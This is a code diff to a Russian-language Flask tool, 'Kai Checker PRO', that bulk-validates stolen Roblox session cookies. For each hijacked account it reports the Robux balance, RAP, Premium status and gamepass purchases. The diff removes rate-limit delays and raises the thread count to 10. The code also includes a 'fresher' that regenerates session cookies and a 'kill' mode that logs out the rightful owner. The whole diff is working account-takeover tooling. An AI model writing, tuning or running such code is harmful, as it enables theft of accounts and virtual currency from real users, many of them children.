@@ -159,7 +159,7 @@ HTML = r"""<!DOCTYPE html>
                 </div>
             </div>
             <div class="card">
-                <h2>📦 Массовая проверка (8 Потоков)</h2>
+                <h2>📦 Массовая проверка (10 Потоков)</h2>
                 <div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()">
                     <p style="font-weight:700;">📁 Перетащите TXT файл с куками</p>
                     <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или нажмите для выбора</p>
@@ -178,7 +178,7 @@ HTML = r"""<!DOCTYPE html>
     </div>
     <div class="tab-content" id="tab-fresher">
         <div class="card">
-            <h2>🔄 Обновление сессий (8 Потоков)</h2>
+            <h2>🔄 Обновление сессий (10 Потоков)</h2>
             <div style="display:flex;gap:12px;margin-bottom:14px;align-items:center;flex-wrap:wrap;">
                 <span style="font-size:13px;font-weight:700;color:var(--text-muted);">Режим:</span>
                 <button class="btn btn-secondary btn-sm fresher-mode-btn active-mode" id="btnDup" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
@@ -539,12 +539,11 @@ def get_all_purchases(user_id, cookie):
     total_spent = 0
     try:
         cursor = ""
-        page = 0
-        while page < 5:
+        for page in range(2):  # Только 2 страницы
             url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?limit=100&transactionType=Purchase"
             if cursor:
                 url += f"&cursor={cursor}"
-            r = requests.get(url, headers=headers, timeout=15)
+            r = requests.get(url, headers=headers, timeout=10)
             if r.status_code != 200:
                 break
             data = r.json()
@@ -561,19 +560,15 @@ def get_all_purchases(user_id, cookie):
             cursor = data.get('nextPageCursor')
             if not cursor:
                 break
-            page += 1
-            time.sleep(0.15)
     except:
         pass
     return purchases_by_game, total_spent
 
 # ==================== ФОРМАТИРОВАНИЕ ОТЧЕТА ====================
 def format_game_purchases(game_purchases):
-    """Геймпассы группируются по названию, сортируются по цене"""
     if not game_purchases:
         return "❌ Геймпассов не найдено"
     
-    # Фильтруем только основные игры
     filtered = {}
     for game, passes in game_purchases.items():
         for target in MAIN_GAMES:
@@ -584,14 +579,12 @@ def format_game_purchases(game_purchases):
         return "❌ Геймпассов в основных играх не найдено"
     
     result = ""
-    # Сортируем игры по общей сумме доната
     sorted_games = sorted(filtered.items(), key=lambda x: sum(p['price'] for p in x[1]), reverse=True)
     
     for game, passes in sorted_games[:10]:
         total = sum(p['price'] for p in passes)
         result += f"\n  🎮 {game} — {len(passes)} гп, ⏣ {total:,}"
         
-        # ГРУППИРУЕМ ОДИНАКОВЫЕ ГЕЙМПАССЫ
         grouped = {}
         for p in passes:
             key = p['name']
@@ -599,7 +592,6 @@ def format_game_purchases(game_purchases):
                 grouped[key] = {'count': 0, 'price': p['price']}
             grouped[key]['count'] += 1
         
-        # Сортируем по цене (от дорогих к дешёвым)
         sorted_passes = sorted(grouped.items(), key=lambda x: x[1]['price'], reverse=True)
         
         for name, data in sorted_passes[:5]:
@@ -624,8 +616,6 @@ def format_single_report(info):
 📅 Дата регистрации: {info['created_date']}
 ⭐ Premium: {prem_str}
 💵 Robux: {info['robux']:,}
-⏳ Pending Robux: {info['pending_robux']:,}
-💳 Баланс / Credit: ${info['credit']}
 💎 RAP: {info['rap']:,}
 ========================================
 📦 ГЕЙМПАССЫ (основные игры):
@@ -641,48 +631,50 @@ def format_single_report(info):
 
 # ==================== ПОЛУЧЕНИЕ ДАННЫХ АККАУНТА ====================
 def get_account_data(cookie):
-    time.sleep(0.2)  # Задержка 200 мс между запросами
     cookie = clean_cookie(cookie)
     headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
-    res_user = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=15)
+    
+    # 1. Проверка куки
+    res_user = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
     if res_user.status_code != 200:
         return None
     user_data = res_user.json()
     user_id = user_data.get("id")
     username = user_data.get("name")
     display_name = user_data.get("displayName")
+    
+    # 2. Robux
     robux = 0
-    res_robux = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=15)
+    res_robux = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=8)
     if res_robux.status_code == 200:
         robux = res_robux.json().get("robux", 0)
+    
+    # 3. Premium и дата
     is_premium = False
     created_date = "N/A"
-    res_details = requests.get(f"https://users.roblox.com/v1/users/{user_id}", headers=headers, timeout=15)
+    res_details = requests.get(f"https://users.roblox.com/v1/users/{user_id}", headers=headers, timeout=8)
     if res_details.status_code == 200:
         dt = res_details.json()
         is_premium = dt.get("isPremium", False)
         created_str = dt.get("created", "")
         if created_str:
             created_date = created_str.split("T")[0]
+    
+    # 4. RAP
     rap = 0
-    res_rap = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers, timeout=15)
+    res_rap = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers, timeout=10)
     if res_rap.status_code == 200:
         data = res_rap.json().get("data", [])
         rap = sum(item.get("recentAveragePrice", 0) for item in data)
-    pending_robux = 0
-    res_pend = requests.get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary", headers=headers, timeout=15)
-    if res_pend.status_code == 200:
-        pending_robux = res_pend.json().get("pendingRobuxTotal", 0)
-    credit = "0.00"
-    res_cred = requests.get("https://billing.roblox.com/v1/credit", headers=headers, timeout=15)
-    if res_cred.status_code == 200:
-        credit = f"{res_cred.json().get('balance', 0):.2f}"
-    game_purchases, game_total_spent = get_all_purchases(user_id, cookie)
+    
+    # 5. Геймпассы
+    game_purchases, total_spent = get_all_purchases(user_id, cookie)
+    
     return {
         "user_id": user_id, "username": username, "display_name": display_name,
-        "robux": robux, "pending_robux": pending_robux, "credit": credit,
+        "robux": robux, "pending_robux": 0, "credit": "0.00",
         "is_premium": is_premium, "created_date": created_date, "rap": rap,
-        "cookie": cookie, "game_purchases": game_purchases, "game_total_spent": game_total_spent
+        "cookie": cookie, "game_purchases": game_purchases, "game_total_spent": total_spent
     }
 
 # ==================== ФРЕШЕР (MEOW TOOL) ====================
@@ -695,14 +687,14 @@ def refresh_cookie_action(cookie, mode="duplicate"):
             c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
         cookies_dict = {'.ROBLOSECURITY': c}
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json, text/plain, */*'}
-        check_r = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, headers=headers, timeout=15)
+        check_r = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, headers=headers, timeout=10)
         if check_r.status_code != 200:
             result['error'] = "Кука невалидна"
             return result
         user_data = check_r.json()
         result['username'] = user_data.get('name', '?')
         result['user_id'] = user_data.get('id', '?')
-        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, timeout=15)
+        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, timeout=10)
         csrf_token = csrf_r.headers.get('x-csrf-token')
         if not csrf_token:
             result['error'] = "CSRF token not found"
@@ -732,12 +724,12 @@ def refresh_cookie_action(cookie, mode="duplicate"):
         if mode == "kill":
             try:
                 kill_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
-                requests.post('https://auth.roblox.com/v2/logout', headers=kill_headers, cookies=cookies_dict, timeout=15)
+                requests.post('https://auth.roblox.com/v2/logout', headers=kill_headers, cookies=cookies_dict, timeout=10)
             except:
                 pass
         test_s = requests.Session()
         test_s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
-        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie}, timeout=15)
+        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie}, timeout=10)
         if test_r.status_code == 200 and 'id' in test_r.json():
             result['new_cookie'] = new_cookie
             result['success'] = True
@@ -786,8 +778,7 @@ def mass_check():
     usernames = []
     full_reports = []
     
-    # УМЕНЬШИЛИ ПОТОКИ ДО 8
-    with ThreadPoolExecutor(max_workers=8) as executor:
+    with ThreadPoolExecutor(max_workers=10) as executor:
         future_to_cookie = {executor.submit(get_account_data, c): c for c in cookies}
         for future in as_completed(future_to_cookie):
             info = future.result()
@@ -846,7 +837,7 @@ def run_fresher_api():
         return jsonify({"only_cookies": "Ошибка: Пустой ввод"})
     refreshed = []
     usernames = []
-    with ThreadPoolExecutor(max_workers=8) as executor:
+    with ThreadPoolExecutor(max_workers=10) as executor:
         futures = [executor.submit(refresh_cookie_simple, c, mode) for c in cookies]
         for f in as_completed(futures):
             res = f.result()
@@ -943,5 +934,4 @@ def download_file(filename):
 
 if __name__ == '__main__':
     print("🚀 Kai Checker PRO запущен на http://localhost:5000")
-    # DEBUG ВЫКЛЮЧЕН ДЛЯ СТАБИЛЬНОСТИ
     app.run(host='0.0.0.0', port=5000, debug=False)
